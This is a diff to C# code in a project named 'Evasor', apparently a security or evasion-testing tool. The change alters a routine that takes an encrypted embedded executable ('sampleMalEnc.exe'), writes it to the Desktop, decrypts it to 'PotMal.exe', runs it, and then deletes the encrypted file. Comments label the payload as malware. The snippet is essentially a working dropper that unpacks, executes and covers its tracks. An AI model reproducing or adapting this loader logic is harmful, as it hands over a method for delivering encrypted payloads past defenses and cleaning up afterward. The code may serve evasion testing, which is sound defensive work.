@@ -950,9 +950,10 @@ namespace Evasor
             //Decrypting the malware/executable - sampleMalEnc.exe-----------------------------------------------
             try
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.otptEnc.exe"))
+                //using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.otptEnc.exe"))
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.sampleMalEnc.exe"))
                 {
-                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.otptEnc.exe"), FileMode.Create))
+                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"), FileMode.Create))
                     {
                         for (int i = 0; i < stream.Length; i++)
                         {
@@ -970,7 +971,7 @@ namespace Evasor
             //calling Decrypt
             try
             {
-                DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.otptEnc.exe"),
+                DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"),
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
                 //Start Mal/exec
                 try
@@ -985,6 +986,8 @@ namespace Evasor
                 {
                     otpt += "\nUnable to execute PotMal.exe" + "###############################";
                 }
+                //Delete file
+                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Evasor.sampleMalEnc.exe");
             }
             catch
             {
